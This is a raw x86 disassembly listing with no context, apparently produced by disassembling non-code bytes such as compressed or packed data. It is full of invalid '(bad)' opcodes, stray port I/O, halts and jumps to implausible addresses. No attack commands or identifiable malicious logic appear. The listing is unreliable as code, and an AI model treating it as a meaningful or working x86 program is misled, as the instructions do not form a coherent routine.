  431bd2:	add    al,0xce
  431bd4:	mov    ecx,edi
  431bd6:	cld    
  431bd7:	inc    ebp
  431bd8:	fidivr WORD PTR [ebx]
  431bda:	fbstp  TBYTE PTR [ebp-0x3e]
  431bdd:	mov    eax,DWORD PTR [eax]
  431bdf:	adc    BYTE PTR [ebx-0x3974038b],cl
  431be5:	fadd   st,st(7)
  431be7:	add    BYTE PTR [ebp-0x1],al
  431bea:	mov    ecx,DWORD PTR [esp+edi*8]
  431bed:	inc    ebp
  431bee:	mov    bh,0xc7
  431bf1:	loopne 0x431c38
  431bf3:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  431bf9:	sbb    dh,BYTE PTR [ebx]
  431bfb:	pushf  
  431bfc:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  431c02:	mov    eax,edi
  431c04:	cwde   
  431c05:	inc    ebp
  431c06:	inc    ebp
  431c07:	jne    0x431b94
  431c09:	mov    esp,esp
  431c0b:	clc    
  431c0c:	add    al,0x4d
  431c0e:	mov    DWORD PTR [ebx],esi
  431c10:	or     al,0x33
  431c12:	inc    ebp
  431c13:	lea    ecx,[ebx-0x398d13fd]
  431c19:	add    bh,al
  431c1b:	inc    ebp
  431c1c:	ror    DWORD PTR [ebx+0x45d829],0x8b
  431c23:	add    ebp,esp
  431c25:	shufps xmm1,xmm3,0xc7
  431c29:	(bad)  
  431c2a:	jmp    0x74885753
  431c2f:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  431c35:	hlt    
  431c36:	mov    ecx,DWORD PTR [edi]
  431c38:	fadd   DWORD PTR [ebp+0x0]
  431c3b:	xor    ecx,DWORD PTR [edi]
  431c3d:	add    ecx,ecx
  431c3f:	cmp    edi,edi
  431c41:	pmuludq mm7,QWORD PTR [edx+0x50]
  431c45:	(bad)  
  431c46:	jmp    0x431bd3
  431c48:	mov    edi,esp
  431c4a:	or     al,0xc6
  431c4c:	inc    ebp
  431c4d:	(bad)  
  431c4e:	mov    eax,DWORD PTR [ebp+0x10]
  431c51:	jne    0x431bdc
  431c53:	mov    eax,DWORD PTR [ecx]
  431c55:	clc    
  431c56:	add    BYTE PTR [ebp-0x40],cl
  431c59:	xor    edx,DWORD PTR [eax-0x73]
  431c5c:	jne    0x431c5f
  431c5e:	push   DWORD PTR [edx+0x8]
  431c61:	add    BYTE PTR [ebp+0x45],al
  431c64:	mov    ebp,ecx
  431c66:	cld    
  431c67:	add    BYTE PTR [ebp+0x0],cl
  431c6a:	xor    eax,DWORD PTR [ebp+0x3]
  431c6d:	mov    DWORD PTR [ebx],edi
  431c6f:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  431c75:	sub    eax,0x5d330e4d
  431c7a:	lea    esi,[ebx]
  431c7c:	add    DWORD PTR [ebx],eax
  431c7e:	jb     0x431c69
  431c80:	add    BYTE PTR [eax],al
  431c82:	inc    ebp
  431c83:	add    bl,ch
  431c85:	inc    ebp
  431c86:	mov    esi,DWORD PTR [ebx]
  431c88:	or     al,0x3
  431c8a:	(bad)  
  431c8b:	mov    edi,eax
  431c8d:	in     al,dx
  431c8e:	scas   eax,DWORD PTR es:[edi]
  431c8f:	inc    ebp
  431c90:	mov    esi,DWORD PTR [ebx]
  431c92:	in     al,0x3
  431c94:	add    al,0x89
  431c96:	mov    ecx,DWORD PTR [eax+edi*8]
  431c99:	dec    ebp
  431c9a:	(bad)  
  431c9b:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3165]
  431ca2:	mov    ecx,eax
  431ca4:	cld    
  431ca5:	push   es
  431ca6:	dec    ebp
  431ca7:	add    al,0x33
  431ca9:	mov    DWORD PTR [ebx],eax
  431cab:	in     al,dx
  431cac:	cmp    DWORD PTR [ebp-0x67],eax
  431caf:	mov    eax,DWORD PTR [ebp-0xba0068]
  431cb5:	mov    edx,DWORD PTR [ebp-0x4]
  431cb8:	mov    ecx,DWORD PTR [ebp-0x2c]
  431cbb:	xor    eax,DWORD PTR [ebp+0x3]
  431cbe:	cmp    DWORD PTR [ebx],0x8b32749a
  431cc4:	xor    edi,esp
  431cc6:	jmp    0xff771a18
  431ccb:	add    ecx,DWORD PTR [ebp-0x3f]
  431cce:	xor    ebx,DWORD PTR [edi]
  431cd0:	add    eax,ecx
  431cd2:	cmp    ebx,DWORD PTR [eax]
  431cd4:	mov    ecx,DWORD PTR [ebp-0x4]
  431cd7:	mov    ecx,DWORD PTR [eax]
  431cd9:	adc    BYTE PTR [ebp-0x80],al
  431cdc:	jmp    0x431cdf
  431cde:	mov    eax,DWORD PTR [eax]
  431ce0:	cld    
  431ce1:	mov    bh,0xc6
  431ce3:	push   ecx
  431ce4:	(bad)  
  431ce5:	jne    0x431d45
  431ce7:	dec    ecx
  431ce9:	or     BYTE PTR [ecx+ebx*1],cl
  431cec:	push   ebp
  431ced:	inc    ebp
  431cee:	in     al,dx
  431cef:	add    ebp,esp
  431cf1:	or     bh,al
  431cf3:	dec    ebp
  431cf4:	cld    
  431cf5:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  431cfb:	xor    DWORD PTR [edx],0x2
  431cfe:	pushf  
  431cff:	dec    DWORD PTR [ebx+0x45510cf4]
  431d05:	mov    DWORD PTR [ebx+0x5445fc0c],ecx
  431d0b:	mov    edx,DWORD PTR [ecx+0xc]
  431d0e:	xor    eax,esi
  431d10:	mov    edx,0xc172c7
  431d15:	inc    ebp
  431d16:	mov    esi,DWORD PTR [ebp+0x8]
  431d19:	mov    eax,edx
  431d1b:	call   0x84c7e410
  431d20:	add    DWORD PTR [ebx-0x76bace00],ebx
  431d26:	mov    ebp,eax
  431d28:	or     BYTE PTR [eax],dl
  431d2a:	jo     0x431d79
  431d2c:	push   edi
  431d2d:	xor    esi,DWORD PTR [ebp+0x3]
  431d30:	(bad)  
  431d31:	pmulhuw mm0,mm1
  431d34:	test   DWORD PTR [ebp-0x8],ecx
  431d37:	mov    DWORD PTR [ebp-0x67],eax
  431d3a:	mov    eax,DWORD PTR [ebp-0x4]
  431d3d:	xor    edi,DWORD PTR [ebp-0x73]
  431d40:	xor    eax,DWORD PTR [ebx]
  431d42:	xor    esi,DWORD PTR [edx+0x3]
  431d45:	add    BYTE PTR [ecx],bh
  431d47:	inc    ebp
  431d48:	(bad)  
  431d49:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  431d4f:	mov    DWORD PTR [eax],0x750f0004
  431d55:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  431d5b:	lock add BYTE PTR [ebp+0x0],cl
  431d5f:	mov    esi,DWORD PTR [ebp-0x18]
  431d62:	mov    ebp,edx
  431d64:	or     al,0x72
  431d66:	ja     0x431d68
  431d68:	mov    edx,esi
  431d6a:	cld    
  431d6b:	(bad)  
  431d6e:	cli    
  431d6f:	mov    esi,DWORD PTR [ebp-0x4]
  431d72:	cmp    ecx,esi
  431d74:	bswap  edi
  431d76:	(bad)
  431d7a:	mov    esi,DWORD PTR [ebp-0x4]
  431d7d:	mov    esi,ecx
  431d7f:	clc    
  431d80:	repnz add esi,DWORD PTR [ebp+0x45]
  431d84:	push   ebx
  431d85:	xor    eax,DWORD PTR [ebp+0x3]
  431d88:	cmp    al,0x5f
  431d8a:	pushf  
  431d8b:	pop    ebx
  431d8c:	jmp    0x431e53
  431d91:	mov    esi,DWORD PTR [ebp-0x7d]
  431d94:	xor    ebp,DWORD PTR [eax]
  431d96:	lea    eax,[ebp-0x8]
  431d99:	xor    edx,esi
  431d9b:	pushf  
  431d9c:	out    dx,eax
  431d9d:	(bad)  
  431d9e:	neg    eax
  431da0:	ins    DWORD PTR es:[edi],dx
  431da1:	test   esi,edi
  431da3:	clc    
  431da4:	pop    esp
  431da5:	inc    ebp
  431da6:	or     BYTE PTR [ecx+0x450f0c7d],cl
  431dac:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  431db2:	add    cl,al
  431db4:	jne    0x431d51
  431db6:	mov    esi,DWORD PTR [edx]
  431db8:	in     al,dx
  431db9:	push   esi
  431dba:	xor    BYTE PTR [ebp-0xe],dh
  431dbd:	add    edi,esi
  431dbf:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  431dc5:	add    cl,bh
  431dc7:	mov    edi,DWORD PTR [ebp+0x8]
  431dca:	mov    DWORD PTR [ebp-0x14],esi
  431dcd:	add    esi,DWORD PTR [ebp+0x3c]
  431dd0:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  431dd6:	mov    ah,0x3e
  431dd8:	fwait
  431dd9:	pushf  
  431dda:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  431de0:	jne    0x431d6d
  431de2:	mov    ecx,DWORD PTR [esp+ebp*8]
  431de5:	icebp  
  431de6:	icebp  
  431de7:	shl    edx,0xf2
  431dea:	(bad)  
  431deb:	mov    ah,0x16
  431ded:	push   eax
  431dee:	jne    0x431d83
  431df0:	mov    ecx,DWORD PTR [edi]
  431df2:	in     al,dx
  431df3:	jmp    0x431de6
  431df5:	add    dl,dh
  431df7:	mov    edi,esi
  431df9:	or     al,0x8
  431dfb:	inc    ebp
  431dfc:	jne    0x431e01
  431dfe:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  431e04:	ret    
  431e05:	or     bh,bh
  431e07:	jge    0x431df1
  431e09:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  431e0f:	xor    edi,eax
  431e11:	add    esi,DWORD PTR [ebp-0x77]
  431e14:	mov    ebx,esp
  431e16:	clc    
  431e17:	neg    DWORD PTR [ebp-0x7c]
  431e1a:	xor    eax,DWORD PTR [eax]
  431e1c:	cmp    eax,DWORD PTR [eax]
  431e1e:	repz jne 0x431db6
  431e21:	xor    eax,DWORD PTR [ecx]
  431e23:	add    ebx,DWORD PTR [eax]
  431e25:	mov    DWORD PTR [ebp-0x8],eax
  431e28:	mov    eax,edi
  431e2a:	cld    
  431e2b:	lock pop eax
  431e2d:	test   DWORD PTR [ebx],esi
  431e2f:	clc    
  431e30:	add    edx,DWORD PTR [edi-0x740bff77]
  431e36:	fdivp  st(4),st
  431e38:	test   ecx,esi
  431e3a:	(bad)  
  431e3b:	jnp    0x431e3c
  431e3d:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  431e43:	jae    0x431dd0
  431e45:	sub    edi,esp
  431e47:	(bad)  
  431e48:	shl    DWORD PTR [eax-0x3e],0x89
  431e4c:	leave  
  431e4d:	call   0x8198d55a
  431e52:	in     al,dx
  431e53:	(bad)  
  431e54:	in     al,dx
  431e55:	add    bh,al
  431e57:	mov    esp,edi
  431e59:	in     al,dx
  431e5a:	test   DWORD PTR [ebp-0x8],edi
  431e5d:	mov    eax,DWORD PTR [ebp+0x2b]
  431e60:	xor    al,BYTE PTR [ebx]
  431e62:	pushf  
  431e63:	jnp    0x57321a9c
  431e69:	xor    edx,DWORD PTR [ecx+ecx*4+0x51]
  431e6d:	loopne 0x431ea2
  431e6f:	jne    0x431e2c
  431e71:	mov    esi,DWORD PTR [edx-0x20]
  431e74:	add    BYTE PTR [ebp-0x3d],bh
  431e77:	xor    eax,DWORD PTR [ebp-0x73]
  431e7a:	mov    edi,DWORD PTR [esi]
  431e7c:	cld    
  431e7d:	jb     0x431e45
  431e7f:	add    bl,al
  431e81:	jne    0x431ec8
  431e83:	mov    edx,DWORD PTR [edi-0x10]
  431e86:	jge    0x431f05
  431e88:	mov    esi,DWORD PTR [ebx]
  431e8a:	lock add ecx,DWORD PTR [ebp+0x3b]
  431e8e:	xor    esi,DWORD PTR [ebp-0x77]
  431e91:	mov    esi,eax
  431e93:	lock inc ebp
  431e95:	jge    0x431ec8
  431e97:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  431e9e:	dec    ebp
  431e9f:	mov    esi,DWORD PTR [ebx]
  431ea1:	loopne 0x431e2c
  431ea3:	jge    0x431e9d
  431ea5:	add    DWORD PTR [ebp-0x7d],eax
  431ea8:	icebp  
  431ea9:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  431eb0:	dec    ebp
  431eb1:	hlt    
  431eb2:	xor    ebx,DWORD PTR [ebp-0x77]
  431eb5:	mov    esi,esp
  431eb7:	in     al,0x45
  431eb9:	jge    0x431ef8
  431ebb:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  431ec2:	dec    ebp
  431ec3:	push   esp
  431ec4:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  431eca:	inc    ebp
  431ecb:	hlt    
  431ecc:	xor    DWORD PTR [ebp-0x61],esi
  431ecf:	mov    edi,DWORD PTR [eax+0xf19504]
  431ed5:	repnz mov DWORD PTR [ebp+0x20],ebx
  431ed9:	cmp    eax,DWORD PTR [ebp+0xf]
  431edc:	test   DWORD PTR [edi+ecx*1-0x1],edx
  431ee0:	fistp  WORD PTR [ebx+0x0]
  431ee3:	inc    ebp
  431ee4:	mov    ebx,DWORD PTR [edi+0xc]
  431ee7:	add    eax,eax
  431ee9:	inc    ebp
  431eea:	test   BYTE PTR [ebx],dh
  431eec:	add    eax,DWORD PTR [ebx]
  431eee:	add    BYTE PTR [esi+0x45],bl
  431ef1:	ret    0x85
  431ef4:	jnp    0x5443a2c3
  431efa:	inc    bp
  431efc:	inc    ebp
  431efd:	xor    DWORD PTR [ecx+0xc78a9c],edi
  431f03:	fdiv   QWORD PTR [ebx]
  431f05:	test   DWORD PTR [ecx+0x453bf8],edi
  431f0b:	push   ebx
  431f0c:	add    edi,DWORD PTR [esi+0x708088b]
  431f12:	cmp    esi,eax
  431f14:	setnp  BYTE PTR [ecx-0x74fcffce]
  431f1b:	mov    esp,edi
  431f1d:	call   0x33ce646f
  431f22:	or     BYTE PTR [ebx],al
  431f24:	inc    ecx
  431f25:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  431f2b:	and    BYTE PTR [ebp-0x7074f0bb],al
  431f31:	lock add cl,al
  431f34:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  431f3b:	mov    ch,0x45
  431f3d:	clc    
  431f3e:	xor    eax,DWORD PTR [ebp+0x3]
  431f41:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  431f47:	inc    ebp
  431f48:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  431f4e:	mov    edi,eax
  431f50:	mov    eax,DWORD PTR [ebp+0x3c]
  431f53:	mov    ecx,DWORD PTR [eax]
  431f55:	hlt    
  431f56:	inc    ebp
  431f57:	ror    DWORD PTR [ebx+0x818c45],0xf4
  431f5e:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  431f64:	push   ebp
  431f65:	mov    edi,DWORD PTR [ebx]
  431f67:	in     al,dx
  431f68:	jne    0x431f2b
  431f6a:	mov    eax,DWORD PTR [ebp-0x28]
  431f6d:	add    DWORD PTR [eax],0xe8058dec
  431f73:	clc    
  431f74:	mov    esi,DWORD PTR [edi-0x8]
  431f77:	add    dh,dl
  431f79:	rol    WORD PTR [ebp-0x1],cl
  431f7d:	mov    edx,DWORD PTR [eax+0x8]
  431f80:	jne    0x431f42
  431f82:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  431f89:	inc    ebp
  431f8a:	push   esp
  431f8b:	test   DWORD PTR [ecx+0xf],ecx
  431f8e:	sub    edx,esp
  431f90:	add    eax,DWORD PTR [eax]
  431f92:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  431f98:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  431f9f:	mov    eax,DWORD PTR [ecx]
  431fa1:	and    BYTE PTR [eax],al
  431fa3:	cmp    al,0x10
  431fa5:	add    BYTE PTR [ebp+0x66],al
  431fa8:	inc    ecx
  431faa:	push   esp
  431fab:	add    dh,BYTE PTR [ebp+0x0]
  431fae:	push   edx
  431faf:	enterw 0xc1,0x4d
  431fb4:	mov    esp,DWORD PTR [esi+0x20]
  431fb7:	add    DWORD PTR [ecx-0x7b],eax
  431fba:	add    eax,DWORD PTR [ebx]
  431fbc:	str    WORD PTR [eax+0x45]
  431fc0:	lea    ecx,[ebx+0x45890801]
  431fc6:	sbb    BYTE PTR [ebx],al
  431fc8:	dec    ebp
  431fc9:	cmp    al,0xf
  431fcb:	inc    ebp
  431fcc:	push   eax
  431fcd:	mov    esi,DWORD PTR [ebx]
  431fcf:	push   eax
  431fd0:	add    eax,eax
  431fd2:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  431fd9:	inc    ebp
  431fda:	add    BYTE PTR [ecx],dh
  431fdc:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  431fe3:	(bad)  
  431fe4:	mov    ebx,eax
  431fe6:	loopne 0x43202d
  431fe8:	dec    ebp
  431fe9:	mov    ecx,DWORD PTR [edi]
  431feb:	cld    
  431fec:	push   eax
  431fed:	xchg   DWORD PTR [ebx],esi
  431fef:	add    DWORD PTR [ebx],ebp
  431ff1:	add    BYTE PTR [ebx],ch
  431ff3:	or     BYTE PTR [ecx],bh
  431ff5:	dec    ecx
  431ff6:	loopne 0x431ffb
  431ff8:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  431ffe:	push   ebp
  431fff:	add    DWORD PTR [ebx+0x55100800],eax
  432005:	dec    ebp
  432006:	jmp    0x431f91
  432008:	mov    esp,DWORD PTR [eax]
  43200a:	sbb    dl,dl
  43200c:	inc    eax
  43200d:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  432013:	add    BYTE PTR [ebx+0x74528555],cl
  432019:	push   ebp
  43201a:	div    DWORD PTR [ebx]
  43201c:	and    eax,DWORD PTR [ebx]
  43201e:	add    edx,DWORD PTR [edx-0x30]
  432021:	jno    0x431fae
  432023:	inc    DWORD PTR [eax+eiz*1]
  432026:	inc    ebp
  432027:	push   eax
  432028:	push   eax
  432029:	mov    esp,DWORD PTR [edi-0x74beff1c]
  43202f:	mov    edi,esp
  432031:	push   eax
  432032:	inc    ebp
  432033:	enter  0x458b,0x8
  432037:	push   ecx
  432038:	(bad)  
  432039:	call   0x10d2a11
  43203e:	pop    ss
  43203f:	push   ebp
  432040:	mov    ecx,DWORD PTR [ebx+0x489408]
  432046:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  43204c:	push   ecx
  43204d:	jo     0x432037
  43204f:	inc    DWORD PTR [edi]
  432051:	or     BYTE PTR [eax],al
  432053:	call   0xce279d
  432058:	fmul   QWORD PTR [ebp+0x55]
  43205b:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  432061:	mov    bh,0x8c
  432063:	adc    al,0x9b
  432065:	dec    esp
  432066:	xor    bl,BYTE PTR [eax]
  432068:	mov    ecx,DWORD PTR [ebp+0xc]
  43206b:	mov    eax,DWORD PTR [ebp-0x4]
  43206e:	mov    esi,DWORD PTR [edi-0x3148f924]
  432074:	push   es
  432075:	retf   
  432076:	mov    BYTE PTR [ebp-0x30],0x3b
  43207a:	inc    ebp
  43207b:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  432082:	retf   0x83fc
  432085:	into   
  432086:	dec    ebp
  432087:	retf   
  432088:	mov    ecx,DWORD PTR [ebp-0x74]
  43208b:	mov    eax,DWORD PTR [eax]
  43208d:	fdiv   QWORD PTR [ebx]
  43208f:	mov    bh,0x3
  432091:	push   es
  432092:	mov    esi,ecx
  432094:	sbb    cl,dl
  432096:	dec    ebp
  432097:	sar    DWORD PTR [ebx],cl
  432099:	push   ebp
  43209a:	jne    0x4320ab
  43209c:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  4320a2:	lea    ebx,[eax]
  4320a4:	call   0xf4ccac6b
  4320a9:	sbb    dh,dl
  4320ab:	add    edx,ebx
  4320ad:	push   ebp
  4320ae:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  4320b4:	push   ecx
  4320b5:	mov    DWORD PTR [eax-0x30],edx
  4320b8:	test   DWORD PTR [edx],eax
  4320ba:	xadd   esp,esi
  4320bd:	pop    es
  4320be:	add    cl,dl
  4320c0:	mov    eax,ecx
  4320c2:	or     al,0x45
  4320c4:	(bad)  
  4320c5:	push   eax
  4320c6:	add    DWORD PTR [edx+0x0],eax
  4320c9:	add    ecx,DWORD PTR [ecx]
  4320cb:	and    dh,cl
  4320cd:	call   0xc7299d
  4320d2:	add    DWORD PTR [ebp+0x0],edx
  4320d5:	mov    esp,DWORD PTR [ebp+0x18]
  4320d8:	add    BYTE PTR [eax+0x50],cl
  4320db:	xor    eax,DWORD PTR [eax]
  4320dd:	add    esp,DWORD PTR [esi+0x3b]
  4320e0:	inc    ebp
  4320e1:	je     0x432066
  4320e3:	push   ecx
  4320e4:	dec    BYTE PTR [ebp-0x77]
  4320e7:	add    eax,esi
  4320e9:	or     al,0x5e
  4320eb:	inc    eax
  4320ec:	add    BYTE PTR [ebx],al
  4320ee:	data16 and BYTE PTR [ebp+0x50],al
  4320f2:	sub    DWORD PTR [ecx],0xfffffff8
  4320f5:	add    BYTE PTR [ebp-0x75],ah
  4320f8:	add    BYTE PTR [eax],bl
  4320fa:	enter  0x894d,0x8b
  4320fe:	int3   
  4320ff:	loopne 0x4320c3
  432101:	rol    BYTE PTR [eax],0x33
  432104:	lea    cx,[ebp+0xa]
  432108:	data16 jb 0x432150
  43210b:	add    BYTE PTR [ebx+0x44890855],cl
  432111:	sbb    ah,al
  432113:	inc    ebp
  432114:	cmp    al,0xf
  432116:	add    BYTE PTR [edx+0x66],dl
  432119:	xor    ecx,DWORD PTR [eax]
  43211b:	sub    eax,DWORD PTR [edx]
  43211d:	mov    eax,DWORD PTR [eax]
  43211f:	or     al,0x66
  432121:	ror    edx,cl
  432123:	dec    ebp
  432124:	inc    ebp
  432125:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  43212b:	cld    
  43212c:	or     BYTE PTR [edi+0x4501dd],dl
  432132:	ret    0xecce
  432135:	retf   
  432136:	(bad)  
  432137:	dec    ebp
  432138:	mov    al,0x8b
  43213a:	loopne 0x43215c
  43213c:	cmp    ecx,DWORD PTR [edx]
  43213e:	inc    ebp
  43213f:	daa    
  432140:	loopne 0x4320c9
  432142:	in     al,dx
  432143:	add    edi,eax
  432145:	add    BYTE PTR [eax+0x3f52e155],bh
  43214b:	push   ebp
  43214c:	inc    ebp
  43214d:	xor    ebx,edx
  43214f:	add    ebp,esp
  432151:	push   edx
  432152:	push   bp
  432154:	inc    ebp
  432155:	(bad)  
  432156:	in     eax,dx
  432157:	push   esp
  432158:	(bad)  
  432159:	inc    edx
  43215b:	sbb    al,0x33
  43215d:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  432164:	add    BYTE PTR [ebp+0x46],0x8b
  432168:	jmp    0xf98b:0x100041c8
  43216f:	xor    esi,DWORD PTR [edx+0x3]
  432172:	mov    ecx,DWORD PTR [edi]
  432174:	fmul   DWORD PTR [edx]
  432176:	add    BYTE PTR [eax],al
  432178:	lea    eax,[ebx-0x4700273c]
  43217e:	add    al,0x4f
  432180:	pop    DWORD PTR [eax]
  432182:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  432188:	push   edx
  432189:	inc    WORD PTR [ebp+0x8]
  43218d:	mov    eax,0x514f4d
  432192:	(bad)
  432196:	add    al,al
  432198:	xor    DWORD PTR [ebx-0x74baf730],eax
  43219e:	test   DWORD PTR [esi+0x74],esp
  4321a1:	inc    ebp
  4321a2:	mov    DWORD PTR [eax+0xa4e08],edi
  4321a8:	add    BYTE PTR [ecx-0x76c435bb],cl
  4321ae:	or     dh,cl
  4321b0:	or     eax,0x8b8d5045
  4321b5:	inc    ebp
  4321b6:	mov    WORD PTR [ecx+0x3b8a00],?
  4321bc:	jne    0x4321f1
  4321be:	mov    edi,DWORD PTR [edx+0x8f3b18]
  4321c4:	add    DWORD PTR [ebx],eax
  4321c6:	add    bh,bh
  4321c8:	adc    DWORD PTR [eax],ecx
  4321ca:	adc    DWORD PTR [ebp+0x55],edi
  4321cd:	push   es
  4321ce:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  4321d4:	mov    ebp,DWORD PTR [eax+ebp*1+0x503811da]
  4321db:	inc    ebp
  4321dc:	mov    esp,edi
  4321de:	or     al,0xda
  4321e0:	push   eax
  4321e1:	(bad)  
  4321e2:	jne    0x432198
  4321e4:	call   0x3b1ad3
  4321e9:	inc    ebp
  4321ea:	sar    BYTE PTR [eax],0x84
  4321ed:	in     al,dx
  4321ee:	add    bh,al
  4321f0:	add    BYTE PTR [ebp+esi*2-0x247426],bh
  4321f7:	(bad)  
  4321f8:	and    al,al
  4321fa:	fs in  eax,dx
  4321fc:	inc    DWORD PTR [ebp-0x7b]
  4321ff:	jle    0x432210
  432201:	leave  
  432202:	scas   al,BYTE PTR es:[edi]
  432203:	inc    esp
  432204:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  43220b:	or     BYTE PTR [ebx-0x97717c8],0x83
  432212:	call   DWORD PTR [edi]
  432214:	shr    ah,0x84
  432217:	xchg   DWORD PTR [eax],eax
  432219:	add    DWORD PTR [eax],eax
  43221b:	add    bh,bh
  43221d:	dec    ebp
  43221e:	and    BYTE PTR [ecx-0x38],dl
  432221:	push   eax
  432222:	dec    DWORD PTR [ebx+0xfd885]
  432228:	mov    BYTE PTR [ebp+0x508bac00],cl
  43222e:	mov    WORD PTR [ecx+0x0],ss
  432231:	lea    ecx,[ebx+0x108b20d8]
  432237:	mov    WORD PTR [edx],ds
  432239:	add    BYTE PTR [edi+0xff01ff],al
  43223f:	mov    ecx,DWORD PTR [ebp-0x28]
  432242:	push   ecx
  432243:	shl    BYTE PTR [ebp+0x3a],0x8b
  432247:	inc    ebp
  432248:	in     al,0xeb
  43224a:	jno    0x4321d7
  43224c:	push   edx
  43224d:	mov    DWORD PTR [eax-0x28],edx
  432250:	mov    eax,DWORD PTR [ebp+0x20]
  432253:	je     0x4321dc
  432255:	mov    eax,DWORD PTR [ecx]
  432257:	sbb    BYTE PTR [eax],al
  432259:	pop    DWORD PTR [eax]
  43225b:	add    esi,eax
  43225d:	add    bl,al
  43225f:	adc    DWORD PTR [edi],esi
  432261:	jmp    0x8bce72b3
  432266:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  43226d:	jne    0x4321fa
  43226f:	mov    ecx,DWORD PTR [eax]
  432271:	in     al,0x75
  432273:	pop    DWORD PTR [ecx+0x5401]
  432279:	push   edx
  43227a:	inc    DWORD PTR [ebx]
  43227c:	adc    BYTE PTR [ecx+0x45721cc6],cl
  432282:	add    BYTE PTR [edi+0x9],dl
  432285:	call   DWORD PTR [esi]
  432287:	and    dl,al
  432289:	and    bh,bh
  43228b:	inc    edi
  43228d:	test   eax,edx
  43228f:	sldt   ebx
  432292:	xor    al,BYTE PTR [eax]
  432294:	pushf  
  432295:	(bad)  
  432296:	jmp    0x4322a4
  432298:	mov    eax,edi
  43229a:	or     al,0x75
  43229c:	inc    eax
  43229d:	call   0x4319a5
  4322a2:	mov    eax,eax
  4322a4:	loopne 0x43222a
  4322a6:	inc    ebp
  4322a7:	add    BYTE PTR [ebx+0x1451c00],cl
  4322ad:	mov    eax,DWORD PTR [ebp+0x20]
  4322b0:	add    edi,ecx
  4322b2:	add    BYTE PTR [eax],ch
  4322b4:	cmp    edi,0x18
  4322b7:	test   DWORD PTR [ebp+0xf],esi
  4322ba:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  4322c1:	jne    0x4322c5
  4322c3:	call   0xffa21d88
  4322c8:	leave  
  4322c9:	rcr    BYTE PTR [esp+eax*4],0x55
  4322cd:	add    ah,ch
  4322cf:	add    BYTE PTR [edi-0x48fef979],dh
  4322d5:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  4322dc:	inc    esp
  4322dd:	mov    ebx,DWORD PTR [eax]
  4322df:	fcom   st(2)
  4322e1:	add    BYTE PTR [edi],bl
  4322e3:	lea    ecx,[eax-0x18]
  4322e6:	(bad)  
  4322e7:	push   DWORD PTR [ecx]
  4322e9:	call   0xffb5704b
  4322ee:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  4322f2:	fstp   DWORD PTR [esi+ebx*8]
  4322f5:	push   ebp
  4322f6:	pop    ebp
  4322f7:	mov    esi,DWORD PTR [edx-0x38]
  4322fa:	add    DWORD PTR [eax],0x28
  4322fd:	mov    edi,DWORD PTR [ebx]
  4322ff:	xor    esi,DWORD PTR [edx+0x3]
  432302:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  432306:	pop    ebp
  432307:	or     al,0x4
  432309:	inc    ecx
  43230a:	push   ebp
  43230b:	(bad)  
  43230c:	in     al,dx
  43230d:	or     ah,ch
  43230f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432310:	xbegin 0xffc89906
  432316:	clc    
  432317:	adc    al,0x45
  432319:	div    BYTE PTR [edx]
  43231b:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  432322:	test   DWORD PTR [ebx+0x666300f8],ebx
  432328:	add    BYTE PTR [ecx+0x66],dh
  43232b:	add    eax,DWORD PTR [ebp+0x52]
  43232e:	adc    eax,0xffffffa0
  432331:	xchg   DWORD PTR [ecx+0x4400fc01],ecx
  432337:	test   DWORD PTR [eax],eax
  432339:	clc    
  43233a:	data16 or al,BYTE PTR [ebp+0x45]
  43233e:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  432345:	rol    BYTE PTR [ebp+0x45],1
  432348:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  43234e:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  432354:	push   ebx
  432355:	add    BYTE PTR [eax+eax*1+0x51],dl
  432359:	jge    0x43238e
  43235b:	add    BYTE PTR [esi+0x4],dl
  43235e:	jne    0x4323c5
  432360:	mov    edx,0x457200
  432365:	jmp    0x432329
  432367:	xor    edi,DWORD PTR [ebx]
  432369:	pop    edi
  43236a:	cvtdq2ps xmm7,xmm0
